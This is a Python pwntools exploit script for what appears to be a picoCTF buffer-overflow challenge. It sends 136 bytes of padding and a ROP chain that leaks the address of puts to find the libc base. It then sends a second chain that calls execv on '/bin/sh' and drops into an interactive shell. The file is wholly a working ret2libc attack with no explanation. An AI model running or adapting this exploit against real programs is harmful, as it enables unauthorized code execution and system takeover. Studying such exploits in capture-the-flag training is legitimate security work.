from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        # r = remote("mercury.picoctf.net", 49464)
        r = process("./vuln_patched")

    return r


def main():
    r = conn()

    binary = ELF("./vuln_patched")
    context.binary = binary
    libc = ELF("./libc.so.6")

    rop = ROP(binary)
    rop.call("puts", [binary.got["puts"]])
    rop.call("main")

    payload = b""
    payload += b"A" * 136
    payload += rop.chain()

    r.sendline(payload)

    r.recvline()
    r.recvline()
    puts_addr = u64(r.recvline().rstrip().ljust(8, b"\x00"))
    log.info(f"puts: {puts_addr:x}")
    libc.address = puts_addr - libc.sym["puts"]
    log.info(f"libc: {libc.address:x}")

    rop = ROP(libc)
    rop.execv(next(libc.search(b"/bin/sh")), 0)

    payload = b""
    payload += b"A" * 136
    payload += rop.chain()
    print(payload)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()

